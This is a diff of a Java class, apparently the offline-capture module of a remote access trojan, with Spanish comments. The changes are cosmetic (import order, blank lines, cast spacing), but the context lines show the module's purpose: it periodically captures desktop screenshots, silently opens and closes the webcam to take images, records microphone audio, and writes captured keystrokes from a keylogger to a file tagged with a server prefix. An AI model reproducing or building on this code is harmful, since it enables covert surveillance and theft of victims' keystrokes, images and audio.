@@ -1,13 +1,12 @@
 package rt.modulos.var;
 
 import comunes.Captura;
-
+import comunes.Interfaz;
 import comunes.PantallaBloque;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.Date;
 import rt.Inicio;
-import comunes.Interfaz;
 import rt.util.IMG;
 import rt.util.UtilRT;
 
@@ -25,13 +24,11 @@ public class COFF extends Thread implements Interfaz {
     private int delayEscritorio;//delay entre captura del escritprio
     private int delayCamara;//delay entre captura de la camara
     private int delayAudio;//delay entre captura del audio del microfono
-
     private int delayMinimo;//debe haber un minimo de espera, esta variable contendra el valor minimo de espera
     private long capturaAnteriorEscritorio;//captura anterior
     private long capturaAnteriorCamara;//captura camara|
     private boolean copiando = false;//copiando
     private String prefijo;//el prefijo del servidor, se usa para distinguir el archivo de capturas
-
     //definen la ultima vez q se capturaron
     private long ultimaVezEscritorio;
     private long ultimaVezCam;
@@ -116,15 +113,12 @@ public class COFF extends Thread implements Interfaz {
                 PantallaBloque bloque;
                 Captura captura;
                 bloque = new PantallaBloque();
-
                 //abro la camara
                 servicio.ejecutar(14);
                 //tomo los datos de la imagen
                 bloque.setDatos((byte[]) ((Interfaz) servicio.get(13)).get(0));
-
                 //cierro la camara
                 servicio.ejecutar(15);
-
                 criterio = UtilRT.generarChecksum(bloque.getDatos());
                 if (criterio != capturaAnteriorCamara) {
                     captura = new Captura();
@@ -153,9 +147,9 @@ public class COFF extends Thread implements Interfaz {
 
     private void capturaKeyLogger() {
         try {
-            if (kl != null && (Boolean)kl.get(0)) {
+            if (kl != null && (Boolean) kl.get(0)) {
                 esperarCopia();//por si acaso se activa la copia despues de pasar el if
-                UtilRT.agregarTexto(archivoKeylogger, (String)kl.get(1));
+                UtilRT.agregarTexto(archivoKeylogger, (String) kl.get(1));
                 kl.ejecutar(2);//vaciar
             }
         } catch (Exception e) {
@@ -206,7 +200,7 @@ public class COFF extends Thread implements Interfaz {
                 }
             }
         } catch (Exception ex) {
-//            ex.printStackTrace();
+
             //servicio.enviarMensaje("Error al realizar captura offline " + ex.getMessage());
             servicio.ejecutar(6, "Error al realizar captura offline " + ex.getMessage());
         }
